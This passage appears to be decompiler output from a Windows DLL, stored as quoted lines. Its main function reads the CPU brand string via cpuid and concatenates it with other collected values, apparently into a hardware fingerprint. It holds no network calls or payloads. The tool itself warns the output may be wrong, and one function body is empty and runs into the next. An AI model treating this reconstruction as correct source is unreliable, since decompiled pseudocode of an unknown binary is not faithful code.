    "  }",
    "  if ( v49 > 0xF )",
    "  {",
    "    v10 = v48[0];",
    "    v11 = v49 + 1;",
    "    if ( v49 + 1 >= 0x1000 )",
    "    {",
    "      v10 = (void *)*((_DWORD *)v48[0] - 1);",
    "      v11 = v49 + 36;",
    "      if ( (unsigned int)((char *)v48[0] - (char *)v10 - 4) > 0x1F )",
    "        goto LABEL_32;",
    "    }",
    "    v35 = v11;",
    "    sub_100154EB(v10);",
    "  }",
    "  v48[4] = 0;",
    "  v49 = 15;",
    "  LOBYTE(v48[0]) = 0;",
    "  if ( v44 > 0xF )",
    "  {",
    "    v12 = Src;",
    "    v13 = v44 + 1;",
    "    if ( v44 + 1 >= 0x1000 )",
    "    {",
    "      v12 = (_BYTE *)*((_DWORD *)Src - 1);",
    "      v13 = v44 + 36;",
    "      if ( (unsigned int)((_BYTE *)Src - v12 - 4) > 0x1F )",
    "        goto LABEL_32;",
    "    }",
    "    v35 = v13;",
    "    sub_100154EB(v12);",
    "  }",
    "  if ( v47 > 0xF )",
    "  {",
    "    v14 = v45[0];",
    "    v15 = v47 + 1;",
    "    if ( v47 + 1 < 0x1000",
    "      || (v14 = (void *)*((_DWORD *)v45[0] - 1), v15 = v47 + 36,",
    "                                                 (unsigned int)((char *)v45[0] - (char *)v14 - 4) <= 0x1F) )",
    "    {",
    "      v35 = v15;",
    "      sub_100154EB(v14);",
    "      return a1;",
    "    }",
    "LABEL_32:",
    "    _invalid_parameter_noinfo_noreturn();",
    "  }",
    "  return a1;",
    "}",
    "",
    "",
    "int __userpurge sub_10008F90@<eax>(int a1@<ecx>, size_t a2@<ebx>, int a3)",
    "{",
    "  int v8; // esi",
    "  size_t v9; // ebx",
    "  unsigned int v10; // esi",
    "  unsigned int v11; // edi",
    "  int v17; // edi",
    "  void *v18; // eax",
    "  void *v19; // edx",
    "  int v20; // ecx",
    "  void *v21; // edx",
    "  size_t v22; // ecx",
    "  WCHAR *v23; // edi",
    "  void *v24; // eax",
    "  void *v25; // edx",
    "  size_t v26; // ecx",
    "  void *v27; // edx",
    "  int v28; // ecx",
    "  WCHAR *v29; // edi",
    "  int v30; // esi",
    "  void *v31; // eax",
    "  void *v32; // edx",
    "  int v33; // ecx",
    "  void *v34; // edx",
    "  int v35; // ecx",
    "  void **v36; // eax",
    "  void **v37; // eax",
    "  void **v38; // ecx",
    "  void **v39; // eax",
    "  int v40; // ecx",
    "  void **v41; // eax",
    "  int v42; // edi",
    "  size_t v43; // ecx",
    "  void **v44; // ecx",
    "  size_t v45; // esi",
    "  void *v46; // edi",
    "  int v47; // esi",
    "  void *v48; // eax",
    "  void *v49; // edx",
    "  int v50; // ecx",
    "  void *v51; // edx",
    "  size_t v52; // ecx",
    "  void **v53; // eax",
    "  void **v54; // eax",
    "  void **v55; // ecx",
    "  void **v56; // eax",
    "  int v57; // eax",
    "  void **v58; // edx",
    "  int v59; // ecx",
    "  void **v60; // eax",
    "  int v61; // edi",
    "  size_t v62; // esi",
    "  int *v63; // ecx",
    "  void **v64; // eax",
    "  void **v65; // ecx",
    "  int v66; // edx",
    "  size_t v67; // edi",
    "  void **v68; // esi",
    "  void **v69; // eax",
    "  void **v70; // ecx",
    "  int v71; // edx",
    "  size_t v72; // edi",
    "  __int128 *v73; // esi",
    "  __int128 *v74; // eax",
    "  void **v75; // ecx",
    "  int v76; // edx",
    "  size_t v77; // edi",
    "  void **v78; // eax",
    "  char *v79; // esi",
    "  void **v80; // eax",
    "  void **v81; // ecx",
    "  int v82; // edx",
    "  size_t v83; // edi",
    "  __int128 *v84; // esi",
    "  __int128 *v85; // eax",
    "  void **v86; // ecx",
    "  int v87; // edx",
    "  size_t v88; // edi",
    "  _BYTE *v89; // esi",
    "  _BYTE *v90; // eax",
    "  void **v91; // ecx",
    "  size_t v92; // edi",
    "  int v93; // edx",
    "  void **v94; // eax",
    "  char *v95; // esi",
    "  void **v96; // eax",
    "  _DWORD *v97; // eax",
    "  void *v99; // [esp-30h] [ebp-22Ch]",
    "  void *v100; // [esp-30h] [ebp-22Ch]",
    "  void *v101; // [esp-30h] [ebp-22Ch]",
    "  void *v102; // [esp-30h] [ebp-22Ch]",
    "  void *v103; // [esp-30h] [ebp-22Ch]",
    "  void *v104; // [esp-30h] [ebp-22Ch]",
    "  void *v105; // [esp-30h] [ebp-22Ch]",
    "  void *v106; // [esp-30h] [ebp-22Ch]",
    "  int v107; // [esp-2Ch] [ebp-228h]",
    "  int v108; // [esp-2Ch] [ebp-228h]",
    "  int v109; // [esp-2Ch] [ebp-228h]",
    "  int v110; // [esp-2Ch] [ebp-228h]",
    "  int v111; // [esp-2Ch] [ebp-228h]",
    "  int v112; // [esp-2Ch] [ebp-228h]",
    "  int v113; // [esp-2Ch] [ebp-228h]",
    "  int v114; // [esp-2Ch] [ebp-228h]",
    "  int v115; // [esp-28h] [ebp-224h]",
    "  int v116; // [esp-28h] [ebp-224h]",
    "  int v117; // [esp-28h] [ebp-224h]",
    "  int v118; // [esp-28h] [ebp-224h]",
    "  int v119; // [esp-28h] [ebp-224h]",
    "  int v120; // [esp-28h] [ebp-224h]",
    "  int v121; // [esp-28h] [ebp-224h]",
    "  int v122; // [esp-28h] [ebp-224h]",
    "  int v123; // [esp-24h] [ebp-220h]",
    "  int v124; // [esp-24h] [ebp-220h]",
    "  int v125; // [esp-24h] [ebp-220h]",
    "  int v126; // [esp-24h] [ebp-220h]",
    "  int v127; // [esp-24h] [ebp-220h]",
    "  int v128; // [esp-24h] [ebp-220h]",
    "  int v129; // [esp-24h] [ebp-220h]",
    "  int v130; // [esp-24h] [ebp-220h]",
    "  int v131; // [esp-20h] [ebp-21Ch]",
    "  int v132; // [esp-20h] [ebp-21Ch]",
    "  int v133; // [esp-20h] [ebp-21Ch]",
    "  int v134; // [esp-20h] [ebp-21Ch]",
    "  int v135; // [esp-20h] [ebp-21Ch]",
    "  int v136; // [esp-20h] [ebp-21Ch]",
    "  int v137; // [esp-20h] [ebp-21Ch]",
    "  int v138; // [esp-20h] [ebp-21Ch]",
    "  int v139; // [esp-1Ch] [ebp-218h]",
    "  int v140; // [esp-1Ch] [ebp-218h]",
    "  int v141; // [esp-1Ch] [ebp-218h]",
    "  int v142; // [esp-1Ch] [ebp-218h]",
    "  int v143; // [esp-1Ch] [ebp-218h]",
    "  int v144; // [esp-1Ch] [ebp-218h]",
    "  int v145; // [esp-1Ch] [ebp-218h]",
    "  int v146; // [esp-1Ch] [ebp-218h]",
    "  void *v147; // [esp-18h] [ebp-214h] BYREF",
    "  int v148; // [esp-14h] [ebp-210h]",
    "  int v149; // [esp-10h] [ebp-20Ch]",
    "  int v150; // [esp-Ch] [ebp-208h]",
    "  void **v151; // [esp-8h] [ebp-204h]",
    "  size_t v152; // [esp-4h] [ebp-200h]",
    "  int v153; // [esp+0h] [ebp-1FCh]",
    "  int v154; // [esp+4h] [ebp-1F8h]",
    "  int v155[6]; // [esp+10h] [ebp-1ECh] BYREF",
    "  int v156[17]; // [esp+28h] [ebp-1D4h] BYREF",
    "  __int128 v157; // [esp+6Ch] [ebp-190h] BYREF",
    "  __int64 v158; // [esp+7Ch] [ebp-180h]",
    "  __int128 v159; // [esp+84h] [ebp-178h] BYREF",
    "  __int64 v160; // [esp+94h] [ebp-168h]",
    "  void *v161[4]; // [esp+9Ch] [ebp-160h] BYREF",
    "  __int64 v162; // [esp+ACh] [ebp-150h]",
    "  void *v163[4]; // [esp+B4h] [ebp-148h] BYREF",
    "  __int64 v164; // [esp+C4h] [ebp-138h]",
    "  _BYTE v165[24]; // [esp+CCh] [ebp-130h] BYREF",
    "  int v166; // [esp+E4h] [ebp-118h]",
    "  void *v167[4]; // [esp+E8h] [ebp-114h] BYREF",
    "  int v168; // [esp+F8h] [ebp-104h]",
    "  unsigned int v169; // [esp+FCh] [ebp-100h]",
    "  int v170; // [esp+100h] [ebp-FCh]",
    "  int v171; // [esp+104h] [ebp-F8h]",
    "  int v172; // [esp+108h] [ebp-F4h]",
    "  size_t v173; // [esp+10Ch] [ebp-F0h]",
    "  int v174; // [esp+110h] [ebp-ECh]",
    "  int v175[6]; // [esp+114h] [ebp-E8h] BYREF",
    "  _DWORD v176[6]; // [esp+12Ch] [ebp-D0h] BYREF",
    "  int v177[4]; // [esp+144h] [ebp-B8h] BYREF",
    "  size_t v178; // [esp+154h] [ebp-A8h]",
    "  unsigned int v179; // [esp+158h] [ebp-A4h]",
    "  void *Src[4]; // [esp+15Ch] [ebp-A0h] BYREF",
    "  size_t Size; // [esp+16Ch] [ebp-90h]",
    "  unsigned int v182; // [esp+170h] [ebp-8Ch]",
    "  void *v183[4]; // [esp+174h] [ebp-88h] BYREF",
    "  size_t v184; // [esp+184h] [ebp-78h]",
    "  unsigned int v185; // [esp+188h] [ebp-74h]",
    "  void *v186[4]; // [esp+18Ch] [ebp-70h] BYREF",
    "  size_t v187; // [esp+19Ch] [ebp-60h]",
    "  unsigned int v188; // [esp+1A0h] [ebp-5Ch]",
    "  void *v189[4]; // [esp+1A4h] [ebp-58h] BYREF",
    "  size_t v190; // [esp+1B4h] [ebp-48h]",
    "  unsigned int v191; // [esp+1B8h] [ebp-44h]",
    "  void *v192[4]; // [esp+1BCh] [ebp-40h] BYREF",
    "  size_t v193; // [esp+1CCh] [ebp-30h]",
    "  unsigned int v194; // [esp+1D0h] [ebp-2Ch]",
    "  void *Block[4]; // [esp+1D4h] [ebp-28h] BYREF",
    "  __int64 v196; // [esp+1E4h] [ebp-18h]",
    "  int v197; // [esp+1F8h] [ebp-4h]",
    "",
    "  v166 = a1;",
    "  v171 = a3;",
    "  v174 = a3;",
    "  sub_1000A970(v153, v154);",
    "  v170 = sub_10002FE0();",
    "  sub_100031E0();",
    "  _EAX = 0x80000000;",
    "  v152 = a2;",
    "  __asm { cpuid }",
    "  v8 = _EBX;",
    "  v9 = v152;",
    "  *(_DWORD *)&v165[8] = _EAX;",
    "  *(_DWORD *)&v165[12] = v8;",
    "  *(_DWORD *)&v165[16] = _ECX;",
    "  *(_DWORD *)&v165[20] = _EDX;",
    "  v10 = _EAX;",
    "  v173 = _EAX;",
    "  memset(v156, 0, 0x40u);",
    "  v11 = 0x80000000;",
    "  if ( v10 >= 0x80000000 )",
    "  {",
    "    do",
    "    {",
    "      _EAX = v11;",
    "      v152 = v9;",
    "      __asm { cpuid }",
    "      v172 = _EBX;",
    "      v9 = v152;",
    "      *(_DWORD *)&v165[8] = _EAX;",
    "      *(_DWORD *)&v165[12] = v172;",
    "      *(_DWORD *)&v165[16] = _ECX;",
    "      *(_DWORD *)&v165[20] = _EDX;",
    "      switch ( v11 )",
    "      {",
    "        case 0x80000002:",
    "          *(_OWORD *)v156 = *(_OWORD *)&v165[8];",
    "          break;",
    "        case 0x80000003:",
    "          *(_OWORD *)&v156[4] = *(_OWORD *)&v165[8];",
    "          break;",
    "        case 0x80000004:",
    "          *(_OWORD *)&v156[8] = *(_OWORD *)&v165[8];",
    "          break;",
    "      }",
    "      ++v11;",
    "    }",
    "    while ( v11 <= v173 );",
    "  }",
    "  v168 = 0;",
    "  v169 = 0;",
    "  *(_OWORD *)v167 = 0;",
    "  sub_100018C0(v167, v156, strlen((const char *)v156));",
    "  v17 = v170;",
    "  v197 = 0;",
    "  v174 = (int)&v147;",
    "  v172 = v170 + 144;",
    "  sub_10009E70(v170 + 144);",
    "  sub_1000B000(&v147, v99, v107, v115, v123, v131, v139);",
    "  LOBYTE(v197) = 1;",
    "  sub_10009E70(v17 + 1344);",
    "  LOBYTE(v197) = 0;",
    "  v18 = (void *)sub_1000B970((int)Block, v100, v108, v116, v124, v132, v140, v147, v148, v149, v150, (int)v151, v152);",
    "  LOBYTE(v197) = 2;",
    "  sub_1000A4E0(v171, v18, v167);",
    "  LOBYTE(v197) = 4;",
    "  if ( HIDWORD(v196) > 0xF )",
    "  {",
    "    v19 = Block[0];",
    "    v20 = HIDWORD(v196) + 1;",
    "    if ( (unsigned int)(HIDWORD(v196) + 1) >= 0x1000 )",
    "    {",
    "      v19 = (void *)*((_DWORD *)Block[0] - 1);",
    "      v20 = HIDWORD(v196) + 36;",
    "      if ( (unsigned int)((char *)Block[0] - (char *)v19 - 4) > 0x1F )",
    "        goto LABEL_113;",
    "    }",
    "    v152 = v20;",
    "    sub_100154EB(v19);",
    "  }",
    "  v196 = 0xF00000000LL;",
    "  LOBYTE(Block[0]) = 0;",
    "  LOBYTE(v197) = 5;",
    "  if ( v169 <= 0xF )",
    "    goto LABEL_17;",
    "  v21 = v167[0];",
    "  v22 = v169 + 1;",
    "  if ( v169 + 1 >= 0x1000 )",
    "  {",
    "    v21 = (void *)*((_DWORD *)v167[0] - 1);",
    "    v22 = v169 + 36;",
    "    if ( (unsigned int)((char *)v167[0] - (char *)v21 - 4) > 0x1F )",
    "LABEL_113:",
    "      _invalid_parameter_noinfo_noreturn();",
    "  }",
    "  v152 = v22;",
    "  sub_100154EB(v21);",
    "LABEL_17:",
    "  v23 = sub_10004100((WCHAR *)v161);",
    "  LOBYTE(v197) = 6;",
    "  v174 = (int)&v147;",
    "  sub_10009E70(v172);",
    "  sub_1000B000(&v147, v101, v109, v117, v125, v133, v141);",
    "  LOBYTE(v197) = 7;",
    "  sub_10009E70(v170 + 1368);",
    "  LOBYTE(v197) = 6;",
    "  v24 = (void *)sub_1000B970((int)v167, v102, v110, v118, v126, v134, v142, v147, v148, v149, v150, (int)v151, v152);",
    "  LOBYTE(v197) = 8;",
    "  sub_1000A4E0(v171, v24, v23);",
    "  LOBYTE(v197) = 10;",
    "  if ( v169 > 0xF )",
    "  {",
    "    v25 = v167[0];",
    "    v26 = v169 + 1;",
    "    if ( v169 + 1 >= 0x1000 )",
    "    {",
    "      v25 = (void *)*((_DWORD *)v167[0] - 1);",
    "      v26 = v169 + 36;",
    "      if ( (unsigned int)((char *)v167[0] - (char *)v25 - 4) > 0x1F )",
    "        goto LABEL_114;",
    "    }",
    "    v152 = v26;",
    "    sub_100154EB(v25);",
    "  }",
    "  v168 = 0;",
    "  v169 = 15;",
    "  LOBYTE(v167[0]) = 0;",
    "  LOBYTE(v197) = 11;",
    "  if ( HIDWORD(v162) <= 0xF )",
    "    goto LABEL_25;",
    "  v27 = v161[0];",
    "  v28 = HIDWORD(v162) + 1;",
    "  if ( (unsigned int)(HIDWORD(v162) + 1) >= 0x1000 )",
    "  {",
    "    v27 = (void *)*((_DWORD *)v161[0] - 1);",
    "    v28 = HIDWORD(v162) + 36;",
    "    if ( (unsigned int)((char *)v161[0] - (char *)v27 - 4) > 0x1F )",
    "LABEL_114:",
    "      _invalid_parameter_noinfo_noreturn();",
    "  }",
    "  v152 = v28;",
    "  sub_100154EB(v27);",
    "LABEL_25:",
    "  v162 = 0xF00000000LL;",
    "  LOBYTE(v161[0]) = 0;",
    "  v29 = sub_10005470((WCHAR *)v163);",
    "  LOBYTE(v197) = 12;",
    "  v174 = (int)&v147;",
    "  sub_10009E70(v172);",
    "  sub_1000B000(&v147, v103, v111, v119, v127, v135, v143);",
    "  v30 = v170;",
    "  LOBYTE(v197) = 13;",
    "  sub_10009E70(v170 + 1392);",
    "  LOBYTE(v197) = 12;",
    "  v31 = (void *)sub_1000B970((int)Block, v104, v112, v120, v128, v136, v144, v147, v148, v149, v150, (int)v151, v152);",
    "  LOBYTE(v197) = 14;",
    "  sub_1000A4E0(v171, v31, v29);",
    "  LOBYTE(v197) = 16;",
    "  if ( HIDWORD(v196) > 0xF )",
    "  {",
    "    v32 = Block[0];",
    "    v33 = HIDWORD(v196) + 1;",
    "    if ( (unsigned int)(HIDWORD(v196) + 1) >= 0x1000 )",
    "    {",
    "      v32 = (void *)*((_DWORD *)Block[0] - 1);",
    "      v33 = HIDWORD(v196) + 36;",
    "      if ( (unsigned int)((char *)Block[0] - (char *)v32 - 4) > 0x1F )",
    "        goto LABEL_115;",
    "    }",
    "    v152 = v33;",
    "    sub_100154EB(v32);",
    "  }",
    "  v196 = 0xF00000000LL;",
    "  LOBYTE(Block[0]) = 0;",
    "  LOBYTE(v197) = 17;",
    "  if ( HIDWORD(v164) <= 0xF )",
    "    goto LABEL_33;",
    "  v34 = v163[0];",
    "  v35 = HIDWORD(v164) + 1;",
    "  if ( (unsigned int)(HIDWORD(v164) + 1) >= 0x1000 )",
    "  {",
    "    v34 = (void *)*((_DWORD *)v163[0] - 1);",
    "    v35 = HIDWORD(v164) + 36;",
    "    if ( (unsigned int)((char *)v163[0] - (char *)v34 - 4) > 0x1F )",
    "LABEL_115:",
    "      _invalid_parameter_noinfo_noreturn();",
    "  }",
    "  v152 = v35;",
    "  sub_100154EB(v34);",
    "LABEL_33:",
    "  v164 = 0xF00000000LL;",
    "  LOBYTE(v163[0]) = 0;",
    "  sub_10009E70(v30 + 1440);",
    "  sub_1000B000(v189, v147, v148, v149, v150, (int)v151, v152);",
    "  LOBYTE(v197) = 18;",
    "  v36 = v189;",
    "  if ( v191 > 0xF )",
    "    v36 = (void **)v189[0];",
    "  v173 = (size_t)v36 + v190;",
    "  v37 = v189;",
    "  if ( v191 > 0xF )",
    "    v37 = (void **)v189[0];",
    "  v38 = (void **)((char *)v37 + v190);",
    "  v39 = v189;",
    "  v152 = 0;",
    "  v151 = v38;",
    "  if ( v191 > 0xF )",
    "    v39 = (void **)v189[0];",
    "  v40 = sub_100153A0(v39, v151, v152);",
    "  v41 = v189;",
    "  if ( v191 > 0xF )",
    "    v41 = (void **)v189[0];",
    "  v173 -= v40;",
    "  v42 = v40 - (_DWORD)v41;",
    "  v43 = v173;",
    "  v174 = v190;",
    "  if ( v190 - v42 < v173 )",
    "    v43 = v190 - v42;",
    "  v173 = v43;",
    "  v44 = v189;",
    "  if ( v191 > 0xF )",
    "    v44 = (void **)v189[0];",
    "  v45 = v190 - v173;",
    "  memmove((char *)v44 + v42, (char *)v44 + v42 + v173, v190 - v173 - v42 + 1);",
    "  v190 = v45;",
    "  v46 = (void *)sub_10008110((int)v167);",
    "  LOBYTE(v197) = 19;",
    "  v174 = (int)&v147;",
    "  sub_10009E70(v172);",
    "  sub_1000B000(&v147, v105, v113, v121, v129, v137, v145);",
    "  LOBYTE(v197) = 20;",
    "  v47 = v170;",
    "  sub_10009E70(v170 + 1416);",
    "  LOBYTE(v197) = 19;",
    "  v48 = (void *)sub_1000B970((int)Block, v106, v114, v122, v130, v138, v146, v147, v148, v149, v150, (int)v151, v152);",
    "  LOBYTE(v197) = 21;",
    "  sub_1000A4E0(v171, v48, v46);",
    "  LOBYTE(v197) = 23;",
    "  if ( HIDWORD(v196) > 0xF )",
    "  {",
    "    v49 = Block[0];",
    "    v50 = HIDWORD(v196) + 1;",
    "    if ( (unsigned int)(HIDWORD(v196) + 1) >= 0x1000 )",
    "    {",
    "      v49 = (void *)*((_DWORD *)Block[0] - 1);",
    "      v50 = HIDWORD(v196) + 36;",
    "      if ( (unsigned int)((char *)Block[0] - (char *)v49 - 4) > 0x1F )",
    "        goto LABEL_116;",
    "    }",
    "    v152 = v50;",
    "    sub_100154EB(v49);",
    "  }",
    "  v196 = 0xF00000000LL;",
    "  LOBYTE(Block[0]) = 0;",
    "  LOBYTE(v197) = 24;",
    "  if ( v169 <= 0xF )",
    "    goto LABEL_53;",
    "  v51 = v167[0];",
    "  v52 = v169 + 1;",
    "  if ( v169 + 1 >= 0x1000 )",
    "  {",
    "    v51 = (void *)*((_DWORD *)v167[0] - 1);",
    "    v52 = v169 + 36;",
    "    if ( (unsigned int)((char *)v167[0] - (char *)v51 - 4) > 0x1F )",
    "LABEL_116:",
    "      _invalid_parameter_noinfo_noreturn();",
    "  }",
    "  v152 = v52;",
    "  sub_100154EB(v51);",
    "LABEL_53:",
    "  v168 = 0;",
    "  v169 = 15;",
    "  LOBYTE(v167[0]) = 0;",
    "  sub_10009E70(v47 + 1464);",
    "  sub_1000B000(v192, v147, v148, v149, v150, (int)v151, v152);",
    "  LOBYTE(v197) = 25;",
    "  v53 = v192;",
    "  if ( v194 > 0xF )",
    "    v53 = (void **)v192[0];",
    "  v173 = (size_t)v53 + v193;",
    "  v54 = v192;",
    "  if ( v194 > 0xF )",
    "    v54 = (void **)v192[0];",
    "  v55 = (void **)((char *)v54 + v193);",
    "  v56 = v192;",
    "  v152 = 0;",
    "  v151 = v55;",
    "  if ( v194 > 0xF )",
    "    v56 = (void **)v192[0];",
    "  v57 = sub_100153A0(v56, v151, v152);",
    "  v58 = v192;",
    "  v59 = v57;",
    "  v60 = v192;",
    "  if ( v194 > 0xF )",
    "    v60 = (void **)v192[0];",
    "  v173 -= v59;",
    "  v61 = v59 - (_DWORD)v60;",
    "  v62 = v173;",
    "  if ( v193 - (v59 - (_DWORD)v60) < v173 )",
    "    v62 = v193 - v61;",
    "  v173 = v62;",
    "  if ( v194 > 0xF )",
    "    v58 = (void **)v192[0];",
    "  v174 = v193 - v62;",
    "  memmove((char *)v58 + v61, (char *)v58 + v61 + v62, v193 - v62 - v61 + 1);",
    "  v193 = v174;",
    "  sub_100067E0(v175);",
    "  LOBYTE(v197) = 26;",
    "  if ( 0x7FFFFFFF - v178 < v193 )",
    "    sub_10001540();",
    "  v63 = v177;",
    "  v152 = v193;",
    "  if ( v179 > 0xF )",
    "    v63 = (int *)v177[0];",
    "  v64 = v192;",
    "  if ( v194 > 0xF )",
    "    v64 = (void **)v192[0];",
    "  sub_1000A6C0(v167, v171, (int)v63, (int)v63, v178, (int)v64, v152);",
    "  LOBYTE(v197) = 27;",
    "  v65 = Src;",
    "  v66 = v168;",
    "  if ( v182 > 0xF )",
    "    v65 = (void **)Src[0];",
    "  v67 = Size;",
    "  v174 = v168;",
    "  v152 = Size;",
    "  v151 = v65;",
    "  if ( Size > v169 - v168 )",
    "  {",
    "    LOBYTE(v174) = 0;",
    "    v69 = (void **)sub_1000A260(v167, Size, v174, (int)v151, v152);",
    "  }",
    "  else",
    "  {",
    "    v68 = v167;",
    "    if ( v169 > 0xF )",
    "      v68 = (void **)v167[0];",
    "    v168 += Size;",
    "    memmove((char *)v68 + v66, v151, v152);",
    "    *((_BYTE *)v68 + v67 + v174) = 0;",
    "    v69 = v167;",
    "  }",
    "  v158 = 0;",
    "  v157 = 0;",
    "  v157 = *(_OWORD *)v69;",
    "  v158 = *((_QWORD *)v69 + 2);",
    "  v69[4] = 0;",
    "  v69[5] = (void *)15;",
    "  *(_BYTE *)v69 = 0;",
    "  LOBYTE(v197) = 28;",
    "  v70 = v192;",
    "  v71 = v158;",
    "  if ( v194 > 0xF )",
    "    v70 = (void **)v192[0];",
    "  v72 = v193;",
    "  v174 = v158;",
    "  v152 = v193;",
    "  v151 = v70;",
    "  if ( v193 > HIDWORD(v158) - (int)v158 )",
    "  {",
    "    LOBYTE(v174) = 0;",
    "    v74 = (__int128 *)sub_1000A260(&v157, v193, v174, (int)v151, v152);",
    "  }",
    "  else",
    "  {",
    "    v73 = &v157;",
    "    if ( HIDWORD(v158) > 0xF )",
    "      v73 = (__int128 *)v157;",
    "    LODWORD(v158) = v158 + v193;",
    "    memmove((char *)v73 + v71, v151, v152);",
    "    *((_BYTE *)v73 + v72 + v174) = 0;",
    "    v74 = &v157;",
    "  }",
    "  v162 = 0;",
    "  *(_OWORD *)v161 = 0;",
    "  *(_OWORD *)v161 = *v74;",
    "  v162 = *((_QWORD *)v74 + 2);",
    "  *((_DWORD *)v74 + 4) = 0;",
    "  *((_DWORD *)v74 + 5) = 15;",
    "  *(_BYTE *)v74 = 0;",
    "  LOBYTE(v197) = 29;",
    "  v75 = v183;",
    "  if ( v185 > 0xF )",
    "    v75 = (void **)v183[0];",
    "  v76 = v162;",
    "  v77 = v184;",
    "  v152 = v184;",
    "  v151 = v75;",
    "  if ( v184 > HIDWORD(v162) - (int)v162 )",
    "  {",
    "    LOBYTE(v174) = 0;",
    "    v80 = (void **)sub_1000A260(v161, v184, v174, (int)v151, v152);",
    "  }",
    "  else",
    "  {",
    "    LODWORD(v162) = v184 + v162;",
    "    v78 = v161;",
    "    if ( HIDWORD(v162) > 0xF )",
    "      v78 = (void **)v161[0];",
    "    v79 = (char *)v78 + v76;",
    "    memmove((char *)v78 + v76, v151, v152);",
    "    v79[v77] = 0;",
    "    v80 = v161;",
    "  }",
    "  v160 = 0;",
    "  v159 = 0;",
    "  v159 = *(_OWORD *)v80;",
    "  v160 = *((_QWORD *)v80 + 2);",
    "  v80[4] = 0;",
    "  v80[5] = (void *)15;",
    "  *(_BYTE *)v80 = 0;",
    "  LOBYTE(v197) = 30;",
    "  v81 = v192;",
    "  v82 = v160;",
    "  if ( v194 > 0xF )",
    "    v81 = (void **)v192[0];",
    "  v83 = v193;",
    "  v174 = v160;",
    "  v152 = v193;",
    "  v151 = v81;",
    "  if ( v193 > HIDWORD(v160) - (int)v160 )",
    "  {",
    "    LOBYTE(v174) = 0;",
    "    v85 = (__int128 *)sub_1000A260(&v159, v193, v174, (int)v151, v152);",
    "  }",
    "  else",
    "  {",
    "    v84 = &v159;",
    "    if ( HIDWORD(v160) > 0xF )",
    "      v84 = (__int128 *)v159;",
    "    LODWORD(v160) = v160 + v193;",
    "    memmove((char *)v84 + v82, v151, v152);",
    "    *((_BYTE *)v84 + v83 + v174) = 0;",
    "    v85 = &v159;",
    "  }",
    "  *(_QWORD *)&v165[16] = 0;",
    "  *(_OWORD *)v165 = 0;",
    "  *(_OWORD *)v165 = *v85;",
    "  *(_QWORD *)&v165[16] = *((_QWORD *)v85 + 2);",
    "  *((_DWORD *)v85 + 4) = 0;",
    "  *((_DWORD *)v85 + 5) = 15;",
    "  *(_BYTE *)v85 = 0;",
    "  LOBYTE(v197) = 31;",
    "  v86 = v186;",
    "  v87 = *(_DWORD *)&v165[16];",
    "  if ( v188 > 0xF )",
    "    v86 = (void **)v186[0];",
    "  v88 = v187;",
    "  v174 = *(_DWORD *)&v165[16];",
    "  v152 = v187;",
    "  v151 = v86;",
    "  if ( v187 > *(_DWORD *)&v165[20] - *(_DWORD *)&v165[16] )",
    "  {",
    "    LOBYTE(v174) = 0;",
    "    v90 = (_BYTE *)sub_1000A260(v165, v187, v174, (int)v151, v152);",
    "  }",
    "  else",
    "  {",
    "    v89 = v165;",
    "    if ( *(_DWORD *)&v165[20] > 0xFu )",
    "      v89 = *(_BYTE **)v165;",
    "    *(_DWORD *)&v165[16] += v187;",
    "    memmove(&v89[v87], v151, v152);",
    "    v89[v174 + v88] = 0;",
    "    v90 = v165;",
    "  }",
    "  v164 = 0;",
    "  *(_OWORD *)v163 = 0;",
    "  *(_OWORD *)v163 = *(_OWORD *)v90;",
    "  v164 = *((_QWORD *)v90 + 2);",
    "  *((_DWORD *)v90 + 4) = 0;",
    "  *((_DWORD *)v90 + 5) = 15;",
    "  *v90 = 0;",
    "  LOBYTE(v197) = 32;",
    "  v91 = v189;",
    "  if ( v191 > 0xF )",
    "    v91 = (void **)v189[0];",
    "  v92 = v190;",
    "  v93 = v164;",
    "  v152 = v190;",
    "  v151 = v91;",
    "  if ( v190 > HIDWORD(v164) - (int)v164 )",
    "  {",
    "    LOBYTE(v174) = 0;",
    "    v96 = (void **)sub_1000A260(v163, v190, v174, (int)v151, v152);",
    "  }",
    "  else",
    "  {",
    "    LODWORD(v164) = v190 + v164;",
    "    v94 = v163;",
    "    if ( HIDWORD(v164) > 0xF )",
    "      v94 = (void **)v163[0];",
    "    v95 = (char *)v94 + v93;",
    "    memmove((char *)v94 + v93, v151, v152);",
    "    v95[v92] = 0;",
    "    v96 = v163;",
    "  }",
    "  v196 = 0;",
    "  *(_OWORD *)Block = 0;",
    "  *(_OWORD *)Block = *(_OWORD *)v96;",
    "  v196 = *((_QWORD *)v96 + 2);",
    "  v96[4] = 0;",
    "  v96[5] = (void *)15;",
    "  *(_BYTE *)v96 = 0;",
    "  LOBYTE(v197) = 33;",
    "  sub_10009FC0(v175);",
    "  sub_100017E0(Block);",
    "  sub_100017E0(v163);",
    "  sub_100017E0(v165);",
    "  sub_100017E0(&v159);",
    "  sub_100017E0(v161);",
    "  sub_100017E0(&v157);",
    "  LOBYTE(v197) = 41;",
    "  sub_100017E0(v167);",
    "  v97 = sub_10003290(v155, v176, (int)v151, v152);",
    "  LOBYTE(v197) = 42;",
    "  sub_1000A070(v97);",
    "  sub_100017E0(v155);",
    "  sub_10001830((_DWORD *)v171, (int)Block);",
    "  sub_100017E0(Block);",
    "  sub_100017E0(v176);",
    "  sub_100017E0(v175);",
    "  sub_100017E0(v192);",
    "  sub_100017E0(v186);",
    "  sub_100017E0(v189);",
    "  sub_100017E0(v183);",
    "  sub_100017E0(Src);",
    "  sub_100017E0(v177);",
    "  return v171;",
    "}",
    "",
    "",
    "_DWORD *__thiscall sub_10009D00(_DWORD *this)",
    "{",
    "  if ( this[5] <= 7u )",
    "    return this;",
    "  else",
    "    return (_DWORD *)*this;",
    "}",
    "",
    "",
    "int __thiscall sub_10009D10(_DWORD *this)",
    "{",
    "  unsigned int v2; // ecx",
    "  _DWORD *v3; // eax",
    "  int result; // eax",
    "",
    "  v2 = this[5];",
    "  if ( v2 > 7 )",
    "  {",
    "    v3 = (_DWORD *)*this;",
    "    if ( 2 * v2 + 2 >= 0x1000 )",
    "    {",
    "      if ( (unsigned int)v3 - *(v3 - 1) - 4 > 0x1F )",
    "        _invalid_parameter_noinfo_noreturn();",
    "      v3 = (_DWORD *)*(v3 - 1);",
    "    }",
    "    sub_100154EB(v3);",
    "  }",
    "  result = 0;",
    "  this[4] = 0;",
    "  this[5] = 7;",
    "  *(_WORD *)this = 0;",
    "  return result;",
    "}",
    "",
    "",
    "// bad sp value at call has been detected, the output may be wrong!",
    "size_t *__thiscall sub_10009D70(size_t *this, _DWORD *a2)",
    "{",
    "}_DWORD *__thiscall sub_10009E70(_DWORD *this, _DWORD *a2)",
    "{",
